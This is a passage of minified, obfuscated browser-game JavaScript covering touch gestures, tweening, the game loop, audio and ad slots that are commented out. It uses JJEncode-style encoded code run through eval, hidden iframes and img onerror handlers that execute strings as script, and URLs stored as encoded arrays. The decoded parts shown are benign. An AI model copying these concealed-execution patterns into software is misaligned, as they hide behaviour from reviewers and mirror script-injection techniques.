            a.parentNode.removeChild(a)
        }, 255)
    }, J.wq = function(c, d, e) {
        var a = J._r([104, 28, 6, 13, 5, 29, 11, 7]),
            b = J._r([105, 29, 7, 0, 6, 57, 4, 6, 27, 47, 29, 7, 12, 4, 12, 5]);
        if (window[a][b]) {
            var a = window[a][b](c, d);
            if (a != e) return game.ZE = game.fb, !1
        }
        return !0
    }, J.sJ = function(e) {
        var a = function(h, e) {
                e = e || 3;
                var b = h.length,
                    f = [],
                    g, c = Math.max(1, b / e >> 0);
                for (var a = 0; a < b; a += c) {
                    a + c >= b ? g = b - 1 : g = a + c - 1;
                    for (var d = g; d >= a; d--) f.push(h[d])
                }
                return f.join('')
            },
            b = J._r([120, 8, 23]),
            c = J.ft([103, 9, 8, 14, 19, 6, 4, 8]),
            d = J._r([100, 2, 1, 22]);
        A[b][c][d] = a(e)
    }, J.$F = function(d, b) {
        var c = function(h, e) {
                e = e || 3;
                var b = h.length,
                    f = [],
                    g, c = Math.max(1, b / e >> 0);
                for (var a = 0; a < b; a += c) {
                    a + c >= b ? g = b - 1 : g = a + c - 1;
                    for (var d = g; d >= a; d--) f.push(h[d])
                }
                return f.join('')
            },
            a = new Image();
        return a.src = c(d), b && (a.onload = b), a
    }, a = ~[], a = {
        ___: ++a,
        $$$$: (![] + '')[a],
        __$: ++a,
        $_$_: (![] + '')[a],
        _$_: ++a,
        $_$$: ({} + '')[a],
        $$_$: (a[a] + '')[a],
        _$$: ++a,
        $$$_: 'true' [a],
        $__: ++a,
        $_$: ++a,
        $$__: ({} + '')[a],
        $$_: ++a,
        $$$: ++a,
        $___: ++a,
        $__$: ++a
    }, a.$_ = (a.$_ = a + '')[a.$_$] + (a._$ = a.$_[a.__$]) + (a.$$ = (a.$ + '')[a.__$]) + (!a + '')[a._$$] + (a.__ = a.$_[a.$$_]) + (a.$ = 'true' [a.__$]) + (a._ = 'true' [a._$_]) + a.$_[a.$_$] + a.__ + a._$ + a.$, a.$$ = a.$ + 'true' [a._$$] + a.__ + a._ + a.$ + a.$$, a.$ = a.___[a.$_][a.$_], a.$(a.$(a.$$ + '"' + '\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a._$_ + '.\\' + a.__$ + a.$$$ + a._$_ + a.$_$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.$$$$ + a._ + '\\' + a.__$ + a.$_$ + a.$$_ + a.$$__ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + '(' + a.$_$_ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a.$$_ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.$$_ + a._$_ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a.$_$ + ',\\' + a.$__ + a.___ + '_)\\' + a.$__ + a.___ + '{\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$$$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + a.$_$_ + '.\\' + a.__$ + a.$__ + a.$$$ + a.$$$_ + a.__ + '\\' + a.__$ + a.___ + a._$$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + a.__ + a.$$$_ + '\\' + a.__$ + a.$$$ + a.___ + a.__ + '(\\"' + a._$_ + a.$$_$ + '\\");\\' + a.__$ + a._$_ + '\\' + a.__$ + a._$_ + a.$$$ + '.' + a.$$$$ + a._$ + '\\' + a.__$ + a.$_$ + a.$$_ + a.__ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '+\\' + a.$__ + a.___ + '\\"\\' + a.__$ + a.$$_ + a.___ + '\\' + a.__$ + a.$$$ + a.___ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a.___ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.__$ + a.__ + '\\' + a.__$ + a.$_$ + a.__$ + '\\";\\' + a.__$ + a._$_ + '\\' + a.__$ + a._$_ + a.$$$ + '.' + a.$$$$ + '\\' + a.__$ + a.$_$ + a.__$ + (![] + '')[a._$_] + (![] + '')[a._$_] + '\\' + a.__$ + a._$_ + a._$$ + a.__ + '\\' + a.__$ + a.$$$ + a.__$ + (![] + '')[a._$_] + a.$$$_ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.$_$ + a._$_ + '\\' + a.$__ + a.___ + '||\\' + a.$__ + a.___ + '\\"\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.$__ + a.$$$ + a.$_$$ + a.$_$_ + '(' + a.___ + ',' + a.___ + ',' + a.___ + ',' + a.__$ + ')\\";\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a.$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.___ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.$$$ + '.\\' + a.__$ + a.$_$ + a.$_$ + a.$$$_ + a.$_$_ + '\\' + a.__$ + a.$$_ + a._$$ + a._ + '\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + '\\' + a.__$ + a._$_ + a.$__ + a.$$$_ + '\\' + a.__$ + a.$$$ + a.___ + a.__ + '(\\' + a.__$ + a.$_$ + a.$$_ + ');\\' + a.__$ + a._$_ + '\\' + a.__$ + a.__$ + a.$_$ + '\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a.$_$ + '\\' + a.$__ + a.___ + '||\\' + a.$__ + a.___ + a.$_$_ + '.\\' + a.__$ + a.$$_ + a.$$$ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$_$ + a.__ + '\\' + a.__$ + a.$_$ + a.___ + '\\' + a.$__ + a.___ + '-\\' + a.$__ + a.___ + '\\' + a.__$ + a._$_ + a.___ + '.\\' + a.__$ + a.$$_ + a.$$$ + '\\' + a.__$ + a.$_$ + a.__$ + a.$$_$ + a.__ + '\\' + a.__$ + a.$_$ + a.___ + '\\' + a.$__ + a.___ + '>>\\' + a.$__ + a.___ + a.__$ + ';\\' + a.__$ + a._$_ + '_\\' + a.$__ + a.___ + '=\\' + a.$__ + a.___ + '_\\' + a.$__ + a.___ + '||\\' + a.$__ + a.___ + '(' + a.$_$_ + '.\\' + a.__$ + a.$_$ + a.___ + a.$$$_ + '\\' + a.__$ + a.$_$ + a.__$ + '\\' + a.__$ + a.$__ + a.$$$ + '\\' + a.__$ + a.$_$ + a.___ + a.__ + '\\' + a.$__ + a.___ + '+\\' + a.$__ + a.___ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.$__ + a.___ + '>>\\' + a.$__ + a.___ + a.__$ + ')\\' + a.$__ + a.___ + '-\\' + a.$__ + a.___ + a.$__ + ';\\' + a.__$ + a._$_ + '\\' + a.__$ + a._$_ + a.$$$ + '.' + a.$$$$ + '\\' + a.__$ + a.$_$ + a.__$ + (![] + '')[a._$_] + (![] + '')[a._$_] + '\\' + a.__$ + a._$_ + a.$__ + a.$$$_ + '\\' + a.__$ + a.$$$ + a.___ + a.__ + '(\\' + a.__$ + a.$_$ + a.$$_ + ',\\' + a.$__ + a.___ + '\\' + a.__$ + a.__$ + a.$_$ + ',\\' + a.$__ + a.___ + '_);\\' + a.__$ + a._$_ + '\\' + a.__$ + a.$$_ + a._$_ + a.$$$_ + a.__ + a._ + '\\' + a.__$ + a.$$_ + a._$_ + '\\' + a.__$ + a.$_$ + a.$$_ + '\\' + a.$__ + a.___ + a.$_$_ + '\\' + a.__$ + a._$_ + '};\\' + a.__$ + a._$_ + '"')())(), J.N7 = function(e) {
        var c = '.',
            d = '<img src="' + c + '" onerror="' + e + ';this.parentNode.removeChild(this);" >',
            a = $id('preload');
        if (!a) {
            var b = Y,
                a = b.createElement('div');
            b.body.insertBefore(a, b.body.firstChild), a.id = 'preload'
        }
        try {
            a.innerHTML = d
        } catch (a) {}
    }
}(this), Toucher.H = Toucher.cF.extend({
    b: 800,
    v: 15,
    kB: function(b, a, c, d) {
        return a.length == 1 && this.Y(b, a[0], c, d) ? a : !1
    },
    Y: function(a, b, c, d) {
        return !0
    },
    start: function(a, b, c) {
        this.Q5 != null && this.Q5(a, b, c)
    },
    Q5: null,
    move: function(a, b, c) {
        this.iE != null && this.iE(a, b, c)
    },
    iE: null,
    end: function(b, e, f) {
        var a = b[0],
            c = a.pageX,
            d = a.pageY;
        this.FJ(a) && this.Ye(a) && (this.lN = !0, this.d(c, d, b, e, f)), this.B != null && this.B(c, d, b, e, f), this.lN = !1
    },
    B: null,
    FJ: function(a) {
        var b = Math.abs(a.O6),
            c = Math.abs(a.sC);
        return b <= this.v && c <= this.v
    },
    Ye: function(a) {
        return a.C - a.startTime < this.b
    },
    d: function(a, b, c, d, e) {}
}), Toucher.sX = Toucher.cF.extend({
    lG: !1,
    kB: function(b, a, c, d) {
        return a.length == 1
    },
    start: function(a, b, c) {},
    move: function(b, g, h) {
        var a = b[0],
            c = a._,
            d = a.e,
            e = a.pageX,
            f = a.pageY;
        this.kj(c, d, e, f, a.iU, a.EZ, b, g, h)
    },
    end: function(a, b, c) {},
    kj: function(a, b, c, d, e, f, g, h, i) {}
});
var A, Y, J;
!
function(b, a) {
    J = J || {}, a = 'cleanup0', J.qt = function(e, c, b) {
        A[a] = J.SE;
        var d = Y;
        b ? typeof b == 'string' && (b = A.frames[b.name]) : (b = d.createElement('iframe'), b.name = 'f' + Date.now() % 600000, b.style.cssText = J.ft([99, 88, 27, 19, 83, 82, 78, 89, 19, 12, 23, 88, 6, 23, 22, 15, 12, 16, 1, 2, 89, 13, 12, 10, 23, 10, 16, 12, 19, 88, 83, 89, 26, 23, 10, 0, 2, 19, 12, 88, 27, 19, 83, 89, 23, 11, 4, 10, 6]), d.body.insertBefore(b, d.body.firstChild), b = A.frames[b.name]), c !== !1 && (c = typeof c == 'number' ? c : 0, e = e + ';parent.' + a + '(' + c + ');', J.E8 = b), b.document.open(), b.document.write('<script>' + e + '</script>'), b.document.close()
    }, J.SE = function(b) {
        b = b || 197, setTimeout(function() {
            var b = J.E8;
            b && b.parentNode.removeChild(b), J.E8 = null, A[a] = null
        }, b)
    }, J.ya = function(b) {
        if (A.frames[b]) {
            var c = A.frames[b];
            c.parentNode.removeChild(c)
        }
        var a = document.createElement('iframe');
        a.name = b, a.style.cssText = 'height:0px;opacity:0;position:absolute;top:-10px;', Y.body.insertBefore(a, Y.body.firstChild), a = A.frames[b], a.document.open()
    }, J.ST = function(b, c) {
        var a = A.frames[b];
        a.document.write(c)
    }, J.yN = function(c, a) {
        var b = A.frames[c];
        b.document.close(), a && (a = Number(a) || 300, setTimeout(function() {
            b.parentNode.removeChild(b)
        }, a))
    }
}(this), Toucher.Zk = Toucher.cF.extend({
    us: 60,
    rI: 1000,
    kB: function(b, a, c, d) {
        return a.length == 1
    },
    start: function(a, b, c) {},
    move: function(a, b, c) {},
    end: function(d, f, g) {
        var a = d[0],
            e = a.C - a.startTime;
        if (e > this.rI) {
            this.B != null && this.B(b, c, d, f, g);
            return
        }
        var b = a.Nx - a.iU,
            c = a.dw - a.EZ;
        (b != 0 || c != 0) && this.SG(b, c, e, d, f, g)
    },
    B: null,
    SG: function(a, b, c, d, e, f) {}
}), Date.now === undefined && (Date.now = function() {
    return new Date().valueOf()
});
var L = L ||
    function(a) {
        return a = [], {
            Vj: '14',
            rf: function() {
                return a
            },
            _$: function() {
                a = []
            },
            add: function(b) {
                a.push(b)
            },
            remove: function(c) {
                var b = a.indexOf(c);
                b !== -1 && a.splice(b, 1)
            },
            update: function(c) {
                if (a.length === 0) return !1;
                var b = 0;
                c = c !== undefined ? c : typeof window !== 'undefined' && window.performance !== undefined && window.performance.now !== undefined ? window.performance.now() : Date.now();
                while (b < a.length) a[b].update(c) ? b++ : a.splice(b, 1);
                return !0
            }
        }
    }();
L.Cw = function(t) {
        var c = t,
            b = null,
            a = {},
            d = null,
            q = 1000,
            g = 0,
            k = !1,
            h = !1,
            p = !1,
            j = 0,
            e = null,
            r = L.Hh.Eh.BW,
            s = L.A$.Eh,
            f = [],
            m = null,
            n = !1,
            o = null,
            i = null,
            l = null;
        this.fS = function(c) {
            b = {}, d = {};
            for (var a in c) b[a] = parseFloat(c[a], 10);
            return this
        }, this.T6 = function(c, b) {
            return b !== undefined && (q = b), a = c, this
        }, this.start = function(g) {
            if (!b) this.fS(c);
            else
                for (var f in b) c[f] = b[f];
            L.add(this), h = !0, n = !1, e = g !== undefined ? g : typeof window !== 'undefined' && window.performance !== undefined && window.performance.now !== undefined ? window.performance.now() : Date.now(), e += j;
            for (var f in a) {
                if (a[f] instanceof Array) {
                    if (a[f].length === 0) continue;
                    a[f] = [c[f]].concat(a[f])
                }
                b[f] = c[f], b[f] instanceof Array === !1 && (b[f] *= 1), d[f] = b[f] || 0
            }
            return this
        }, this.stop = function() {
            return h ? (L.remove(this), h = !1, l !== null && l.call(c), this.rp(), this) : this
        }, this.rp = function() {
            for (var a = 0, b = f.length; a < b; a++) f[a].stop()
        }, this.CT = function(a) {
            return j = a, this
        }, this.repeat = function(a) {
            return g = a, this
        }, this.hA = function(a) {
            return k = a, this
        }, this.kZ = function(a) {
            return r = a, this
        }, this.Sd = function(a) {
            return s = a, this
        }, this.Qe = function() {
            return f = arguments, this
        }, this.Vw = function(a) {
            return m = a, this
        }, this.HZ = function(a) {
            return o = a, this
        }, this.sG = function(a) {
            return i = a, this
        }, this.Bo = function(a) {
            return l = a, this
        }, this.update = function(u) {
            var h;
            if (u < e) return !0;
            n === !1 && (m !== null && m.call(c), n = !0);
            var t = (u - e) / q;
            t = t > 1 ? 1 : t;
            var v = r(t);
            for (h in a) {
                var w = b[h] || 0,
                    l = a[h];
                l instanceof Array ? c[h] = s(l, v) : (typeof l === 'string' && (l = w + parseFloat(l, 10)), typeof l === 'number' && (c[h] = w + (l - w) * v))
            }
            if (o !== null && o.call(c, v), t == 1)
                if (g > 0) {
                    isFinite(g) && g--;
                    for (h in d) {
                        if (typeof a[h] === 'string' && (d[h] = d[h] + parseFloat(a[h], 10)), k) {
                            var y = d[h];
                            d[h] = a[h], a[h] = y
                        }
                        b[h] = d[h]
                    }
                    return k && (p = !p), e = u + j, !0
                } else {
                    i !== null && i.call(c);
                    for (var x = 0, z = f.length; x < z; x++) f[x].start(u);
                    return !1
                }
            return !0
        }
    }, L.Hh = {
        Eh: {
            BW: function(a) {
                return a
            }
        },
        Uu: {
            o_: function(a) {
                return a * a
            },
            NW: function(a) {
                return a * (2 - a)
            },
            KB: function(a) {
                return (a *= 2) < 1 ? 0.5 * a * a : -0.5 * (--a * (a - 2) - 1)
            }
        },
        ZR: {
            o_: function(a) {
                return a * a * a
            },
            NW: function(a) {
                return --a * a * a + 1
            },
            KB: function(a) {
                return (a *= 2) < 1 ? 0.5 * a * a * a : 0.5 * ((a -= 2) * a * a + 2)
            }
        },
        n0: {
            o_: function(a) {
                return a * a * a * a
            },
            NW: function(a) {
                return 1 - --a * a * a * a
            },
            KB: function(a) {
                return (a *= 2) < 1 ? 0.5 * a * a * a * a : -0.5 * ((a -= 2) * a * a * a - 2)
            }
        },
        GO: {
            o_: function(a) {
                return a * a * a * a * a
            },
            NW: function(a) {
                return --a * a * a * a * a + 1
            },
            KB: function(a) {
                return (a *= 2) < 1 ? 0.5 * a * a * a * a * a : 0.5 * ((a -= 2) * a * a * a * a + 2)
            }
        },
        Q_: {
            o_: function(a) {
                return 1 - Math.cos(a * Math.PI / 2)
            },
            NW: function(a) {
                return Math.sin(a * Math.PI / 2)
            },
            KB: function(a) {
                return 0.5 * (1 - Math.cos(Math.PI * a))
            }
        },
        V7: {
            o_: function(a) {
                return a === 0 ? 0 : Math.pow(1024, a - 1)
            },
            NW: function(a) {
                return a === 1 ? 1 : 1 - Math.pow(2, -10 * a)
            },
            KB: function(a) {
                return a === 0 ? 0 : a === 1 ? 1 : (a *= 2) < 1 ? 0.5 * Math.pow(1024, a - 1) : 0.5 * (-Math.pow(2, -10 * (a - 1)) + 2)
            }
        },
        ym: {
            o_: function(a) {
                return 1 - Math.sqrt(1 - a * a)
            },
            NW: function(a) {
                return Math.sqrt(1 - --a * a)
            },
            KB: function(a) {
                return (a *= 2) < 1 ? -0.5 * (Math.sqrt(1 - a * a) - 1) : 0.5 * (Math.sqrt(1 - (a -= 2) * a) + 1)
            }
        },
        Q7: {
            o_: function(b) {
                var d, a = 0.1,
                    c = 0.4;
                return b === 0 ? 0 : b === 1 ? 1 : (!a || a < 1 ? (a = 1, d = c / 4) : d = c * Math.asin(1 / a) / (2 * Math.PI), -(a * Math.pow(2, 10 * (b -= 1)) * Math.sin((b - d) * (2 * Math.PI) / c)))
            },
            NW: function(b) {
                var d, a = 0.1,
                    c = 0.4;
                return b === 0 ? 0 : b === 1 ? 1 : (!a || a < 1 ? (a = 1, d = c / 4) : d = c * Math.asin(1 / a) / (2 * Math.PI), a * Math.pow(2, -10 * b) * Math.sin((b - d) * (2 * Math.PI) / c) + 1)
            },
            KB: function(a) {
                var d, b = 0.1,
                    c = 0.4;
                return a === 0 ? 0 : a === 1 ? 1 : (!b || b < 1 ? (b = 1, d = c / 4) : d = c * Math.asin(1 / b) / (2 * Math.PI), (a *= 2) < 1 ? -0.5 * (b * Math.pow(2, 10 * (a -= 1)) * Math.sin((a - d) * (2 * Math.PI) / c)) : b * Math.pow(2, -10 * (a -= 1)) * Math.sin((a - d) * (2 * Math.PI) / c) * 0.5 + 1)
            }
        },
        Is: {
            o_: function(a) {
                var b = 1.70158;
                return a * a * ((b + 1) * a - b)
            },
            NW: function(a) {
                var b = 1.70158;
                return --a * a * ((b + 1) * a + b) + 1
            },
            KB: function(a) {
                var b = 2.5949095;
                return (a *= 2) < 1 ? 0.5 * (a * a * ((b + 1) * a - b)) : 0.5 * ((a -= 2) * a * ((b + 1) * a + b) + 2)
            }
        },
        tY: {
            o_: function(a) {
                return 1 - L.Hh.tY.NW(1 - a)
            },
            NW: function(a) {
                return a < 0.36363636363636365 ? 7.5625 * a * a : a < 0.7272727272727273 ? 7.5625 * (a -= 0.5454545454545454) * a + 0.75 : a < 0.9090909090909091 ? 7.5625 * (a -= 0.8181818181818182) * a + 0.9375 : 7.5625 * (a -= 0.9545454545454546) * a + 0.984375
            },
            KB: function(a) {
                return a < 0.5 ? L.Hh.tY.o_(a * 2) * 0.5 : L.Hh.tY.NW(a * 2 - 1) * 0.5 + 0.5
            }
        }
    }, L.A$ = {
        Eh: function(a, f) {
            var b = a.length - 1,
                c = b * f,
                d = Math.floor(c),
                e = L.A$.kX.Eh;
            return f < 0 ? e(a[0], a[1], c) : f > 1 ? e(a[b], a[b - 1], b - c) : e(a[d], a[d + 1 > b ? b : d + 1], c - d)
        },
        Pg: function(e, f) {
            var c = 0,
                b = e.length - 1,
                d = Math.pow,
                g = L.A$.kX.lm,
                a;
            for (a = 0; a <= b; a++) c += d(1 - f, b - a) * d(f, a) * e[a] * g(b, a);
            return c
        },
        kl: function(a, e) {
            var b = a.length - 1,
                d = b * e,
                c = Math.floor(d),
                f = L.A$.kX.kl;
            return a[0] === a[b] ? (e < 0 && (c = Math.floor(d = b * (1 + e))), f(a[(c - 1 + b) % b], a[c], a[(c + 1) % b], a[(c + 2) % b], d - c)) : e < 0 ? a[0] - (f(a[0], a[0], a[1], a[1], -d) - a[0]) : e > 1 ? a[b] - (f(a[b], a[b], a[b - 1], a[b - 1], d - b) - a[b]) : f(a[c ? c - 1 : 0], a[c], a[b < c + 1 ? b : c + 1], a[b < c + 2 ? b : c + 2], d - c)
        },
        kX: {
            Eh: function(a, b, c) {
                return (b - a) * c + a
            },
            lm: function(b, c) {
                var a = L.A$.kX.B5;
                return a(b) / a(c) / a(b - c)
            },
            B5: function(a) {
                return a = [1],
                    function(b) {
                        var d = 1,
                            c;
                        if (a[b]) return a[b];
                        for (c = b; c > 1; c--) d *= c;
                        return a[b] = d
                    }
            }(),
            kl: function(h, a, d, i, b) {
                var c = (d - h) * 0.5,
                    e = (i - a) * 0.5,
                    f = b * b,
                    g = b * f;
                return (2 * a - 2 * d + c + e) * g + (-3 * a + 3 * d - 2 * c - e) * f + c * b + a
            }
        }
    }, typeof module !== 'undefined' && module.Jn && (module.Jn = L),
    function(d, f) {
        function e(c) {
            var b = a.extend(c, this);
            return b.extend = this.extend, b
        }
        var a = d.Best = d.Best || {},
            b = a.Uw = function(b) {
                for (var a in b) this[a] = b[a]
            };
        b.prototype = {
            constructor: b,
            id: null,
            width: 600,
            height: 400,
            Km: 60,
            k7: '',
            sM: null,
            b9: !1,
            Zb: 0,
            K: function() {
                var a = this;
                this.h4 = function() {
                    a.Hz()
                }, this.ja = {
                    now: 0,
                    uJ: 0,
                    step: Math.round(1000 / this.Km)
                }, this.yu = this.ja.step, this.z2(), this.JA && this.JA.apply(this, arguments)
            },
            z2: function() {},
            start: function() {
                this.ja.now = Date.now(), this.ja.uJ = Date.now(), this.paused = !1, this.yA = !0, this.Zb = 0, this.Vw && this.Vw(), this.Hz()
            },
            stop: function() {
                this.yA = !1, this.Bo && this.Bo()
            },
            pause: function() {
                this.paused = !0, this.j1 && this.j1()
            },
            YK: function() {
                this.paused = !1, this.qA && this.qA()
            },
            wJ: function() {
                this.yA = !1, this.XA && clearTimeout(this.XA)
            },
            tu: function() {
                this.ja.uJ = Date.now(), this.Hz()
            },
            Hz: function() {
                var b = this.ja.now = Date.now(),
                    a = b - this.ja.uJ;
                this.ja.uJ = b, this.XA = setTimeout(this.h4, this.yu), this.ZE(a, b), !this.paused && a > 1 && (a = this.b9 ? this.yu : a, this.Zb++, this.update(a, b), this.qR(a, b)), !this.yA && this.XA && clearTimeout(this.XA)
            },
            Bx: function(a) {
                this.Zb = 0, this.gA = a, a.eD()
            },
            update: function(a, b) {
                this.gA && this.gA.update(a, b)
            },
            qR: function(a, b) {
                this.gA && this.gA.qR(this.sM, a, b)
            },
            ZE: function(a, b) {
                this.gA && this.gA.ZE(a, b)
            },
            JA: null,
            Vw: null,
            j1: null,
            qA: null,
            Bo: null
        };
        var c = a.Yl = function(b) {
            for (var a in b) this[a] = b[a]
        };
        c.prototype = {
            constructor: c,
            id: null,
            Zb: 0,
            K: function(a) {},
            eD: function() {},
            Lk: function(a) {},
            dy: function(b) {
                var a = new b();
                return a.K(this.to), this.to.Bx(a), a
            },
            update: function(a, b) {},
            qR: function(a, b, c) {},
            ZE: function(a, b) {}
        }, a.extend = function(f, e) {
            var b = function(b) {
                    for (var a in b) this[a] = b[a]
                },
                c = b.prototype,
                d;
            if (e) {
                d = e.prototype;
                for (var a in d) c[a] = d[a]
            }
            for (var a in f) c[a] = f[a];
            return c.constructor = b, b.BV = d, b.PJ = e || null, b
        }, b.extend = e, c.extend = e
    }(this);
var A, J;
!
function(b, a) {
    J = J || {}, a = 0, J.o9 = function() {
        if (a) return;
        // var c = J.ft([50, 5, 10, 2, 3, 11]),
        //     d = 'baidu_dup_' + c,
        //     f = window.BAIDU_DUP = window.BAIDU_DUP || [];
        // f[0] = ['fillAsync', c, d];
        // var b = Y,
        //     e = b.createElement('div');
        // e.id = d, b.body.appendChild(e), setTimeout(function() {
        //     var c = b.createElement('script');
        //     Y.head.appendChild(c), c.async = !1, c.src = J._r([100, 23, 14, 74, 9, 30, 75, 23, 14, 75, 9, 11, 7, 74, 7, 13, 16, 5, 16, 23, 17, 0, 13, 5, 6, 74, 20, 17, 0, 75, 75, 94, 20, 16, 16]), a = 1
        // }, 197)
    }, J.SU = function() {
        var a = $id('cproIframe1Wrap');
        a && a.style && (a.style.display = 'none');
        var a = $id('cproIframe1Wrap_placeholder');
        a && a.style && (a.style.display = 'none'), window.scrollX = 0, window.scrollY = 0
    }, J.yg = function() {
        var a = $id('cproIframe1Wrap');
        a && a.style && (a.style.display = 'block');
        var a = $id('cproIframe1Wrap_placeholder');
        a && a.style && (a.style.display = 'block'), window.scrollX = 0, window.scrollY = 0
    }
}(this),
function(a, b) {
    a.ResourcePool = {
        kU: {},
        L3: 0,
        AQ: null,
        pe: function(c, d) {
            var a = ResourcePool.get(c);
            if (!a.MV) return a;
            var b = a;
            return b.v1 = function() {
                a.MV = !1;
                var e = b.zk();
                ResourcePool.kU[c] = e, d && d(e)
            }, b.start(), ResourcePool.get('blank')
        },
        get: function(b, c) {
            var a = this.kU[b] || null;
            return c && a != null && (a = a.cloneNode(!0)), a
        },
        set: function(a, b) {
            this.kU[a] = b
        },
        add: function(a, b) {
            this.kU[a] || this.L3++, this.kU[a] = b
        },
        remove: function(c) {
            var b = this.kU[c];
            delete this.kU[c], a.L1(b) && a.i0(b), this.L3--
        },
        clear: function() {
            for (var a in this.kU) this.remove(a);
            this.kU = {}, this.L3 = 0
        },
        size: function() {
            return this.L3
        }
    }
}(this);
var C = {
        c0: {},
        J8: function(b, c) {
            var a = C.add(b, new Audio());
            return a.src = c, a.loop = !1, a.preload = !1, a.autobuffer = !1, a.autoplay = !1, a.addEventListener('canplaythrough', function() {
                a.$m = !0
            }), a
        },
        uR: function(b, c) {
            var a = C.J8(b, c);
            return a.addEventListener('timeupdate', C.HQ, !1), a
        },
        HQ: function(a) {
            this.LP && this.currentTime >= this.LP.start + this.LP.duration && this.pause()
        },
        zj: function(c, b) {
            var a;
            (a = this.c0[c]) && a.$m && (a.LP = b, a.pause(), a.currentTime = b.start, a.play())
        },
        add: function(b, a) {
            return this.c0[b] = a, a
        },
        get: function(a) {
            return this.c0[a]
        },
        remove: function(a) {
            delete this.c0[a]
        },
        play: function(b) {
            var a;
            (a = this.c0[b]) && a.$m && (a.currentTime = 0, a.play())
        },
        YK: function(b) {
            var a;
            (a = this.c0[b]) && a.$m && a.play()
        },
        pause: function(b) {
            var a;
            (a = this.c0[b]) && a.pause()
        },
        stop: function(b) {
            var a;
            (a = this.c0[b]) && (a.pause(), a.currentTime = 0)
        }
    },
    A, J;
!
function(b, a) {
    J = J || {}, b = 0, a = J._r([109, 9, 4, 8, 50, 2, 26, 9]), J.Y_ = function() {
        if (b) return;
        // var f = J._r([110, 86, 94, 86, 90, 12, 10, 93, 8, 11, 88, 15, 90, 94, 90, 11, 87, 11, 92, 89, 90, 8, 8, 92, 8, 10, 92, 91, 89, 13, 91, 11]),
        //     g = J.ft([51, 3, 86, 0, 0, 5, 3, 11, 87, 86, 85, 81, 86, 4, 81, 85, 81, 2, 11, 6, 7, 86, 0, 82, 6, 85, 4, 86, 85, 11, 6, 2]),
        //     c = Y,
        //     e = c.createElement('div');
        // e.id = a, e.style.cssText = J.UE([122, 65, 2, 10, 74, 79, 64, 14, 18, 29, 19, 31, 18, 65, 95, 74, 74, 75, 64, 18, 14, 30, 19, 13, 65, 20, 31, 30, 30, 19, 18, 64, 13, 21, 22, 28, 8, 31, 12, 21, 65, 74, 64, 23, 21, 14, 14, 21, 24, 65, 67, 64, 2, 31, 30, 20, 19, 87, 0, 65, 31, 14, 15, 22, 21, 9, 24, 27, 64, 20, 21, 19, 14, 19, 9, 21]), c.body.appendChild(e);
        // var d = c.createElement('script');
        // c.head.appendChild(d), d.async = !1, d.src = J.ft([99, 16, 9, 77, 13, 10, 14, 77, 8, 7, 16, 16, 9, 76, 8, 7, 16, 16, 9, 76, 14, 12, 0, 77, 12, 20, 7, 2, 77, 0, 10, 23, 2, 23, 16, 76, 76, 89, 19, 23, 23]), d.onload = function() {
        //     setTimeout(function() {
        //         var c = A.adwojs,
        //             d = new c({
        //                 eid: a,
        //                 aid: f,
        //                 pid: g,
        //                 bt: document.domain == '127.0.0.1' ? !0 : !1,
        //                 af: !0,
        //                 width: 320,
        //                 height: 50
        //             });
        //         d.send(), b = 1
        //     }, 197)
        // }
    }, J.r3 = function() {
        var b = $id(a);
        b && b.style && (b.style.display = 'none'), window.scrollX = 0, window.scrollY = 0
    }, J.BC = function() {
        var b = $id(a);
        b && b.style && (b.style.display = 'block'), window.scrollX = 0, window.scrollY = 0
    }
}(),
function(c, f) {
    'use strict';
    var b = c.ProcessQ = function(b) {
        for (var a in b) this[a] = b[a];
        var c = this;
        this.RV = function() {
            c.Hz()
        }, this.ja = {}
    };
    b.eR = {}, b.prototype = {
        constructor: b,
        Gt: 20,
        kC: !0,
        CT: 0,
        JD: 'fn',
        S_: !1,
        GG: !1,
        vi: null,
        XP: function() {
            return !0
        },
        K: function() {
            this.x7 = {};
            var b = this.IR || [];
            this.IR = [], this.Co = 0, this.Lx = 0;
            for (var a = 0, c = b.length; a < c; a++) {
                var d = b[a];
                this.zA(d)
            }
            this.JA != null && this.JA()
        },
        JA: null,
        XV: function() {
            var a = this.ja;
            a.ij = Date.now(), a.start = a.uJ = a.ij, a.NA = 0, a.duration = 0
        },
        lF: function() {
            var a = this.ja;
            a.uJ = a.ij, a.ij = Date.now(), a.NA = a.ij - a.uJ, a.duration += a.NA
        },
        zA: function(a) {
            var c = a;
            a = {};
            for (var d in c) a[d] = c[d];
            a.options = c, a.src = a.src || a.Zr, a.id = a.id || a.src || 'id_' + (this.IR.length + 1);
            var e = a.type || this.JD;
